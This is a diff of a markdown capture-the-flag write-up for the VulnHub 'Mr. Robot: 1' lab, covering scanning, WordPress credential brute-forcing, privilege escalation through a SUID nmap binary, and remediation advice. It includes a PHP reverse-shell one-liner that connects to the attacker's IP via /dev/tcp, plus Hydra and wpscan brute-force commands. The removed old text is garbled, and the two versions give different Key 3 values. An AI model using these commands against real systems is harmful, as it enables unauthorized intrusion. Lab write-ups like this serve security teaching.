@@ -3,6 +3,7 @@
 ### Machine Information
 
 | Category | Details |
+| :--- | :--- |
 | **Machine** | Mr. Robot: 1 |
 | **Platform** | VulnHub |
 | **Difficulty** | Intermediate |
@@ -15,7 +16,7 @@
 
 ### Executive Summary
 
-This write-up documents the black-box security assessment of the **Mr. Robot: 1** virtual machine. The attack path starts with subnet host discovery and port enumeration, identifies exposed sensitive files via `robots.txt`, recovers credentials through WordPress user enumeration and dictionary optimization, secures initial remote code execution via an injected theme template, stabilizes the shell, pivots to the local user `robot` via MD5 cracking, and culminates in full root access by exploiting an outdated SUID `nmap` binary.
+This write-up documents the black-box security assessment of the **Mr. Robot: 1** virtual machine. The attack path starts with subnet host discovery and port enumeration, identifies exposed sensitive files via `robots.txt`, recovers credentials through WordPress user enumeration and dictionary optimization, secures initial remote code execution via an injected theme/plugin template, stabilizes the shell, pivots to the local user `robot` via MD5 cracking, and culminates in full root access by exploiting an outdated SUID `nmap` binary.
 
 ---
 
@@ -23,7 +24,7 @@ This write-up documents the black-box security assessment of the **Mr. Robot: 1*
 
 * **Information Exposure (`robots.txt`):** The web server exposed direct links to a customized dictionary (`fsocity.dic`) and the first key (`key-1-of-3.txt`).
 * **Predictable User Enumeration:** WordPress login error messages differentiated between valid and invalid usernames, confirming account `elliot`.
-* **Insecure File Management:** The WordPress theme editor allowed authenticated users to modify PHP template files (`404.php`), granting Remote Code Execution (RCE).
+* **Insecure File Management:** The WordPress file editor allowed authenticated users to modify PHP template/plugin files, granting Remote Code Execution (RCE).
 * **Weak Credential Storage:** An unshadowed MD5 password hash for local user `robot` was stored in a world-readable file (`password.raw-md5`).
 * **Privilege Escalation via SUID Abuse:** Legacy binary `/usr/local/bin/nmap` (v3.81) was configured with the SUID bit set, allowing an interactive shell escape directly to `root`.
 
@@ -35,7 +36,7 @@ This write-up documents the black-box security assessment of the **Mr. Robot: 1*
 Host Discovery (arp-scan / netdiscover)
        │
        ▼
-Service Enumeration (Nmap full TCP scan)
+Service Enumeration (Nmap aggressive scan)
        │
        ▼
 Web Discovery (robots.txt -> key-1-of-3.txt & fsocity.dic)
@@ -44,7 +45,7 @@ Web Discovery (robots.txt -> key-1-of-3.txt & fsocity.dic)
 Credential Recovery (Wordlist deduplication -> WP login brute-force)
        │
        ▼
-Initial Foothold (Theme Editor 404.php -> Reverse Shell)
+Initial Foothold (Plugin Modification -> Reverse Shell)
        │
        ▼
 Horizontal Escalation (MD5 crack -> user 'robot' -> key-2-of-3.txt)
@@ -54,54 +55,278 @@ Vertical Escalation (SUID nmap --interactive breakout -> root)
        │
        ▼
 Final Objective (Root proof & key-3-of-3.txt)
+```
 
-### Phase 1: Reconnaissance & Enumeration1.
+---
 
-#### Host Discovery.
+### Phase 1: Reconnaissance & Enumeration
 
-Target machine was located on the VirtualBox Host-Only subnet (eth1) using arp-scan:
+#### 1. Host Discovery
+The target machine was located on the VirtualBox Host-Only subnet (`eth1`) using `arp-scan`:
 
 ```bash
-arp-scan --interface=eth1 192.168.56.0/24
+sudo arp-scan --interface=eth1 192.168.56.0/24
 ```
-![ARP scan discovering target IP](assets/image/arp-scan.png)
-Target IP confirmed: 192.168.56.105.2.
-Service & Port ScanningA full TCP port scan was performed to detect open ports and versions:Bashsudo nmap -sC -sV -p- -T4 -oN nmap_mr_robot.txt 192.168.56.105
-Key Findings:Port 80/TCP: Apache httpd 2.4.7 ((Ubuntu))Port 443/TCP: Apache httpd (SSL/TLS enabled)Port 22/TCP: Closed / Filtered (SSH unavailable)3. Web Surface Enumeration & Key 1Accessing http://192.168.56.105/robots.txt directly via browser or curl:Bashcurl -s [http://192.168.56.105/robots.txt](http://192.168.56.105/robots.txt)
-Output:PlaintextUser-agent: *
-fsocity.dic
-key-1-of-3.txt
-Navigating to http://192.168.56.105/key-1-of-3.txt yielded Key 1:Plaintext073403c2cd55dd0020b8f43a254304d7
-Downloaded the customized dictionary for local brute-forcing:Bashwget [http://192.168.56.105/fsocity.dic](http://192.168.56.105/fsocity.dic)
-Phase 2: Vulnerability Analysis & Exploitation1. Dictionary OptimizationThe downloaded fsocity.dic contained over 850,000 words with extensive repetition. To speed up authentication attempts, the file was sorted and deduplicated:Bashwc -l fsocity.dic
-# ~858,160 lines
 
+![ARP scan discovering target IP](assets/image/arp-scan.png)
+
+Target IP confirmed: **`192.168.56.105`**.
+
+---
+
+#### 2. Service and Port Scanning
+An aggressive scan was performed to detect OS details, service versions, default scripts, and traceroute:
+
+```bash
+sudo nmap -A 192.168.56.105
+```
+
+![Nmap scan Target Ip](assets/image/nmap-scan.png)
+
+**Key Findings:**
+* **Port 80/TCP:** Apache httpd 2.4.7 ((Ubuntu))
+* **Port 443/TCP:** Apache httpd (SSL/TLS enabled)
+* **Port 22/TCP:** Closed / Filtered (SSH unavailable)
+
+---
+
+#### 3. Web Surface Enumeration & Key 1
+Inspecting `[http://192.168.56.105/robots.txt](http://192.168.56.105/robots.txt)`:
+
+![robots.txt](assets/image/robots.png)
+
+Navigating to `[http://192.168.56.105/key-1-of-3.txt](http://192.168.56.105/key-1-of-3.txt)` yielded **Key 1**:
+
+```text
+073403c2cd55dd0020b8f43a254304d7
+```
+
+Downloaded the customized dictionary `fsocity.dic` for local brute-forcing:
+
+```bash
+wget http://192.168.56.105/fsocity.dic
+```
+
+---
+
+#### 4. Dictionary Optimization
+The downloaded `fsocity.dic` contained over 850,000 words. Sorting and deduplicating the list made brute-force attempts significantly faster:
+
+```bash
+# Check line count of original list
+wc -l fsocity.dic
+
+# Remove duplicate entries and save clean list
 sort -u fsocity.dic > clean_fsocity.dic
+
+# Verify reduced line count
 wc -l clean_fsocity.dic
-# ~11,451 unique lines
-Deduplication reduced the wordlist size by ~98%, significantly reducing brute-force time.2. WordPress User Enumeration & Authentication Brute-ForceInspecting http://192.168.56.105/wp-login.php:Testing invalid user testuser returned: Invalid username.Testing username elliot returned: The password you entered for the username elliot is incorrect.This verified elliot as a valid user account. Using wpscan or hydra against the optimized wordlist:Bashwpscan --url [http://192.168.56.105/](http://192.168.56.105/) -U elliot -P clean_fsocity.dic
-Discovered Credentials: elliot : ER28-06523. Initial Access via Malicious Theme ModificationLogged into the WordPress Dashboard at http://192.168.56.105/wp-login.php.Navigated to Appearance > Editor.Selected the 404 Template (404.php) from the active theme.Overwrote the template content with a standard PHP reverse shell payload pointed to 192.168.56.101:4444.Set up a local Netcat listener on the attacker machine:Bashnc -lvnp 4444
-Triggered the payload by browsing to:Bashcurl -k [https://192.168.56.105/404.php](https://192.168.56.105/404.php)
-A connection was established back to the listener as user daemon.4. Shell StabilizationUpgraded the limited shell to a fully interactive TTY:Bashpython -c 'import pty; pty.spawn("/bin/bash")'
-# Pressed Ctrl+Z to background
+```
+
+![fsociety](assets/image/fsociety.png)
+
+Deduplication reduced the wordlist to ~11,451 unique lines, cutting down brute-force search time significantly.
+
+---
+
+### Phase 2: Vulnerability Analysis & Exploitation
+
+#### 1. Directory Enumeration
+Performed directory fuzzing to identify hidden paths on `[http://192.168.56.105](http://192.168.56.105)`:
+
+```bash
+ffuf -u http://192.168.56.105/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .txt,.php,.html -t 30
+```
+
+An interesting administrative entry point was identified at `/wp-login.php`.
+
+---
+
+#### 2. WordPress User Enumeration and Authentication
+To brute-force credentials efficiently, the exact login error message for invalid usernames was captured:
+
+![wp-login page](assets/image/wp-login.png)
+
+Captured HTTP POST request format:
+
+```http
+POST /wp-login.php HTTP/1.1
+Host: 192.168.56.105
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+Connection: keep-alive
+
+log=r&pwd=&wp-submit=Log+In&redirect_to=https%3A%2F%2F192.168.56.105%2Fwp-admin%2F&testcookie=1
+```
+
+Enumerated valid usernames using Hydra:
+
+```bash
+hydra -L clean_fsocity.dic -p test123 192.168.56.105 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=https%3A%2F%2F192.168.56.105%2Fwp-admin%2F&testcookie=1:F=Invalid username" -t 30
+```
+
+![hydra](assets/image/hydra.png)
+
+Valid account identified: **`elliot`**.
+
+Brute-forced the password for user `elliot` using `wpscan`:
+
+```bash
+wpscan --url http://192.168.56.105/wp-login.php -U elliot -P clean_fsocity.dic
+```
+
+![wpscan](assets/image/wpscan_pass.png)
+
+Discovered credentials: **`elliot`** : **`ER28-0652`**.
+
+---
+
+#### 3. Reverse Shell
+Logged into the WordPress admin dashboard:
+
+![wpdashboard](assets/image/wpdashboard.png)
+
+Started a local Netcat listener on the attacker machine:
+
+```bash
+nc -lvnp 443
+```
+
+Injected a PHP reverse shell one-liner into an editable plugin file (`hello.php`):
+
+```php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/443 0>&1'");
+```
+
+![reverse](assets/image/reverse.png)
+
+Triggered the payload by navigating directly to the plugin path:
+
+```text
+https://192.168.56.105/wp-content/plugins/hello.php
+```
+
+![daemon](assets/image/daemon.png)
+
+A connection was established back to the listener as user `daemon`.
+
+---
+
+#### 4. Shell Stabilization
+Upgraded the limited shell to a fully interactive TTY:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+*Pressed `Ctrl+Z` to background the shell:*
+
+```bash
 stty raw -echo; fg
 export TERM=xterm
-Phase 3: Privilege Escalation1. Horizontal Escalation (daemon -> robot)Enumerating /home:Bashls -la /home/robot
-Directory Contents:-r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt-rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5Inspecting the readable hash file:Bashcat /home/robot/password.raw-md5
-# robot:c3fcd3d76192e4007dfb496cca67e13b
-Cracked the MD5 hash locally using john or hashcat:Bashhashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b clean_fsocity.dic
-Decrypted Password: abcdefghijklmnopqrstuvwxyzSwitched user and retrieved Key 2:Bashsu - robot
+```
+
+![Raw-MD5](assets/image/Raw-MD5.png)
+
+---
+
+### Phase 3: Privilege Escalation
+
+#### 1. Horizontal Escalation (`daemon` -> `robot`)
+Inspected `/home/robot` and discovered a password hash file:
+
+```bash
+echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
+john --format=Raw-MD5 --wordlist=clean_fsocity.dic hash.txt
+john --format=Raw-MD5 --show hash.txt
+```
+
+* **Decrypted Password:** `abcdefghijklmnopqrstuvwxyz`
+
+Switched to the `robot` user:
+
+```bash
+su - robot
+```
+
+![robot](assets/image/robot.png)
+
+Retrieved **Key 2**:
+
+```bash
 cat /home/robot/key-2-of-3.txt
-Key 2: 822c73956184f694993bede3eb39f9592. Vertical Escalation (robot -> root)Searched for files with SUID permission bits:Bashfind / -perm -4000 -type f 2>/dev/null
-Among standard system binaries, /usr/local/bin/nmap was flagged with SUID root permissions. Checking its version:Bash/usr/local/bin/nmap --version
-# Output: Nmap version 3.81
-In versions prior to 5.21, Nmap supported an interactive shell escape mode:Bash/usr/local/bin/nmap --interactive
+```
+
+* **Key 2:** `822c73956184f694993bede3eb39f959`
+
+![key2](assets/image/key2.png)
+
+---
+
+#### 2. Vertical Escalation (`robot` -> `root`)
+Searched for files with the SUID permission bit set:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Among standard system binaries, `/usr/local/bin/nmap` was flagged with SUID root permissions:
+
+![suid](assets/image/suid.png)
+
+Spawned a root shell via Nmap's legacy interactive mode:
+
+```bash
+/usr/local/bin/nmap --interactive
+```
+
+![nmap_i](assets/image/nmap_i.png)
+
+Executed an interactive shell breakout:
+
+```bash
 nmap> !sh
-whoami
-# Output: root
 id
-# Output: uid=0(root) gid=0(root) groups=0(root)
-Retrieved the final flag:Bashcat /root/key-3-of-3.txt
-Key 3: 04a54d6f3093d7177018c2a8e3e6ec65Flags SummaryFlagFile LocationValueKey 1 of 3http://192.168.56.105/key-1-of-3.txt073403c2cd55dd0020b8f43a254304d7Key 2 of 3/home/robot/key-2-of-3.txt822c73956184f694993bede3eb39f959Key 3 of 3/root/key-3-of-3.txt04a54d6f3093d7177018c2a8e3e6ec65Remediation & Defensive HardeningProtect Sensitive Web Assets: Do not host operational wordlists or sensitive keys inside the web server's public document root. Avoid listing critical paths inside robots.txt.Mitigate User Enumeration: Configure web applications to return generic authentication error messages (e.g., "Invalid username or password") to prevent valid account discovery.Disable File Editing in CMS: Add the following directive to wp-config.php to prevent authenticated administrative accounts from modifying PHP files:PHPdefine('DISALLOW_FILE_EDIT', true);
-Upgrade Hashing Algorithms: Transition from legacy, unsalted MD5 hashes to robust password-hashing schemes such as bcrypt or Argon2id.Enforce Least Privilege on Binaries: Regularly audit SUID binaries and remove elevated privileges from tools that allow subshell spawning:Bashsudo chmod u-s /usr/local/bin/nmap
-DisclaimerThis write-up is provided strictly for educational and defensive security purposes. All testing was conducted on an isolated, authorized local virtual machine.
+cat /root/key-3-of-3.txt
+```
+
+![nmap_interactive](assets/image/nmap_interactive.png)
+
+Retrieved the final flag:
+
+* **Key 3:** `04787ddef27c3dee1ee161b21670b4e4`
+
+![Final_flag](assets/image/Final_flag.png)
+
+---
+
+### Flags Summary
+
+| Flag | File Location | Value |
+| :--- | :--- | :--- |
+| **Key 1 of 3** | `[http://192.168.56.105/key-1-of-3.txt](http://192.168.56.105/key-1-of-3.txt)` | `073403c2cd55dd0020b8f43a254304d7` |
+| **Key 2 of 3** | `/home/robot/key-2-of-3.txt` | `822c73956184f694993bede3eb39f959` |
+| **Key 3 of 3** | `/root/key-3-of-3.txt` | `04787ddef27c3dee1ee161b21670b4e4` |
+
+---
+
+### Remediation & Defensive Hardening
+
+* **Protect Sensitive Web Assets:** Do not host operational wordlists or sensitive keys inside the web server's public document root. Remove critical operational paths from `robots.txt`.
+* **Mitigate User Enumeration:** Configure the web application to return generic authentication error messages (e.g., *"Invalid username or password"*) to prevent valid account discovery.
+* **Disable File Editing in CMS:** Add the following directive to `wp-config.php` to prevent administrative accounts from executing code via theme or plugin modifications:
+  ```php
+  define('DISALLOW_FILE_EDIT', true);
+  ```
+* **Upgrade Password Hashing Algorithms:** Transition from unsalted, legacy MD5 hashes to modern salted password-hashing schemes such as `bcrypt` or `Argon2id`.
+* **Enforce Least Privilege on Binaries:** Audit SUID binaries regularly and strip elevated privileges from tools that allow arbitrary subshell execution:
+  ```bash
+  sudo chmod u-s /usr/local/bin/nmap
+  ```
+
+---
+
+### Disclaimer
+
+This write-up is provided strictly for educational and defensive security purposes. All testing was conducted on an isolated, authorized local virtual machine.
